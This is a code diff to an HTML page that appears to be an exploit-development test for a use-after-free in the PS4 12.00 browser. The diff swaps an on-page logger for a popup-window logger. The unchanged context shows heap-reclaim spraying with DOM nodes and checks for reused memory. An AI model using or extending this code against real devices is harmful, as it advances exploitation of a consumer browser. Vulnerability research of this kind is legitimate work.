@@ -2,42 +2,47 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Aggressive Reclaim (JS Textbox Logger)</title>
+<title>PS4 12.00 - UAF Aggressive Reclaim (External Logger FIX)</title>
 </head>
-
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Aggressive Reclaim (Textbox Logger)</h2>
+<h2>PS4 12.00 - UAF Aggressive Reclaim (External Logger)</h2>
 <button onclick="runTest()">Run Test</button>
 
-<!-- 🔥 LOGGER REAL (FIXO NA TELA) -->
-<textarea id="logbox"
-style="
-position:fixed;
-bottom:0;
-left:0;
-width:100%;
-height:40%;
-background:#000;
-color:#0f0;
-z-index:999999;
-font-family:monospace;
-overflow:auto;
-">
-</textarea>
-
 <script>
+let logWindow = null;
 
 // ==========================
-// LOGGER CORRETO (textbox persistente)
+// LOGGER EXTERNO REAL (igual ao que funcionou)
 // ==========================
+function initLogger() {
+    logWindow = window.open("", "logger", "width=600,height=400");
+
+    if (logWindow) {
+        logWindow.document.open();
+        logWindow.document.write(`
+            <html>
+            <body style="background:black;color:lime;font-family:monospace;">
+            <h3>LOG OUTPUT</h3>
+            <pre id="log"></pre>
+            </body>
+            </html>
+        `);
+        logWindow.document.close();
+    }
+}
+
 function log(msg) {
     try { console.log(msg); } catch(e){}
-    let box = document.getElementById("logbox");
-    if (!box) return;
 
-    box.value += msg + "\n";
-    box.scrollTop = box.scrollHeight;
+    try {
+        if (logWindow && !logWindow.closed) {
+            let el = logWindow.document.getElementById("log");
+            if (el) {
+                el.textContent += msg + "\\n";
+            }
+        }
+    } catch(e){}
 }
 
 // ==========================
@@ -80,7 +85,7 @@ function setupFullscreen() {
 }
 
 // ==========================
-// 🎯 TARGETED RECLAIM
+// 🎯 TARGETED RECLAIM (CORRETO)
 // ==========================
 function targetedReclaim() {
     log("[*] Targeted reclaim iniciado");
@@ -112,7 +117,7 @@ function targetedReclaim() {
         if (i < 40) log("REUSE_EL_" + i);
     }
 
-    // Pressão extra
+    // Pressão adicional
     for (let i = 0; i < 10000; i++) {
         let txt = document.createTextNode("TXT_" + i);
         document.body.appendChild(txt);
@@ -133,7 +138,7 @@ function checkUAF(fsTarget) {
         let val = fsTarget.innerHTML;
         log("[CHECK] innerHTML = " + val);
 
-        if (val && val.includes("REUSE_")) {
+        if (val && val.indexOf("REUSE_") !== -1) {
             log("🔥 REUSE DETECTADO (innerHTML)");
         }
 
@@ -145,7 +150,7 @@ function checkUAF(fsTarget) {
         let outer = fsTarget.outerHTML;
         log("[CHECK] outerHTML = " + outer);
 
-        if (outer && outer.includes("REUSE_")) {
+        if (outer && outer.indexOf("REUSE_") !== -1) {
             log("🔥 REUSE DETECTADO (outerHTML)");
         }
 
@@ -157,7 +162,7 @@ function checkUAF(fsTarget) {
         let txt = fsTarget.textContent;
         log("[CHECK] textContent = " + txt);
 
-        if (txt && txt.includes("REUSE_")) {
+        if (txt && txt.indexOf("REUSE_") !== -1) {
             log("🔥 REUSE DETECTADO (textContent)");
         }
 
@@ -190,7 +195,7 @@ function trigger(fsTarget) {
         log("[ERRO] " + e);
     }
 
-    // 🔥 janela crítica
+    // 🔥 janela crítica intacta
     setTimeout(() => targetedReclaim(), 0);
     setTimeout(() => targetedReclaim(), 50);
     setTimeout(() => targetedReclaim(), 100);
@@ -204,7 +209,7 @@ function trigger(fsTarget) {
 // MAIN
 // ==========================
 function runTest() {
-    document.getElementById("logbox").value = "";
+    initLogger(); // 🔥 ESSENCIAL
 
     log("[*] Iniciando teste");
 
